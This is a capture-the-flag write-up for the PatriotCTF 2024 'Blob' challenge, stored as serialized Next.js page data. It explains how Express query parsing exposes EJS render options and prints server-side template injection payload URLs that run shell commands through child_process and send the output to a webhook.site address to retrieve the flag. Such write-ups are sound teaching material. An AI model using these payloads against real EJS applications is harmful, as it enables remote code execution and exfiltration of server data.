1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
b:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
c:"$Sreact.suspense"
:HL["https://gist.github.com/user-attachments/assets/3d80468c-9671-4aae-8a19-e19736d7d2ec","image"]
:HL["https://gist.github.com/user-attachments/assets/92010e87-ea60-4294-9475-958024a34829","image"]
:HL["https://gist.github.com/user-attachments/assets/41721c6b-3276-41fc-9b2d-8d2b124ed949","image"]
:HL["https://gist.github.com/user-attachments/assets/2716b72c-2fc0-47c3-bc42-8ddb21749463","image"]
0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"PatriotCTF 2024 â€” Blob"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"blob says: blob"}],"\n",["$","p","p-1",{"children":["$","a","a-0",{"href":"http://chal.competitivecyber.club:3000","children":"http://chal.competitivecyber.club:3000"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given an express server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"require(\"express\")()\n  .set(\"view engine\", \"ejs\")\n  .use((req, res) => res.render(\"index\", { blob: \"blob\", ...req.query }))\n  .listen(3000);","language":"js"}],"\n",["$","p","p-1",{"children":["Because express by default has ",["$","a","a-0",{"href":"https://expressjs.com/en/api.html#app.settings.table","children":"extended query string parsing enabled"}],","]}],"\n",["$","p","p-2",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/3d80468c-9671-4aae-8a19-e19736d7d2ec","alt":"image"}]}],"\n",["$","p","p-3",{"children":["we essentially have arbitrary access to the options passed to ejs's ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"render()"}]," function."]}],"\n",["$","p","p-4",{"children":["At first glance, we should be able to use the same exploit from ",["$","a","a-0",{"href":"https://gist.github.com/ky28059/80491a6f0250146511a945a0f8bb49c2","children":"a challenge in BitsCTF 2024"}],", but ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"ejs"}]," seems to have ",["$","a","a-1",{"href":"https://github.com/mde/ejs/blob/a4770b8ff49b93387c7f2760d957446cd332531a/lib/ejs.js#L591-L596","children":"patched it in 3.17"}],"."]}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"http://chal.competitivecyber.club:3000/?settings[view%20options][outputFunctionName]=x%0Afetch(%60https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=$%7Bprocess.mainModule.require(%27child_process%27).execSync(%27cat%20flag.txt%27).toString()%7D%60)%0As"}],"\n",["$","p","p-5",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/92010e87-ea60-4294-9475-958024a34829","alt":"image"}]}],"\n",["$","p","p-6",{"children":["Luckily, there's still a plethora of unfixed ejs SSTI CVEs, such as ",["$","a","a-0",{"href":"https://github.com/mde/ejs/issues/735","children":["this one with ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"escapeFunction"}]]}],". Using that, we can go to"]}],"\n",["$","$L2","pre-2",{"className":"my-2","children":"http://chal.competitivecyber.club:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('ls').toString()}`);//"}],"\n",["$","p","p-7",{"children":"to view the directory structure of the server."}],"\n",["$","p","p-8",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/41721c6b-3276-41fc-9b2d-8d2b124ed949","alt":"image"}]}],"\n",["$","p","p-9",{"children":["Then, we can simply use the same exploit to cat ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"flag-aaee2b1430.txt"}]," and get the flag:"]}],"\n","$L3","\n","$L4","\n","$L5"]}]}],["$L6","$L7","$L8","$L9"],"$La"]}],"loading":null,"isPartial":false}
3:["$","$L2","pre-3",{"className":"my-2","children":"http://chal.competitivecyber.club:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('cat%20flag-aaee2b1430.txt').toString()}`);//"}]
4:["$","p","p-10",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/2716b72c-2fc0-47c3-bc42-8ddb21749463","alt":"image"}]}]
5:["$","$L2","pre-4",{"className":"my-2","children":"CACI{bl0b_s4y_pl3453l00k0utf0rpr0707yp3p0llut10n}"}]
6:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
7:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
8:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
9:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
a:["$","$Lb",null,{"children":["$","$c",null,{"name":"Next.MetadataOutlet","children":"$@d"}]}]
d:null
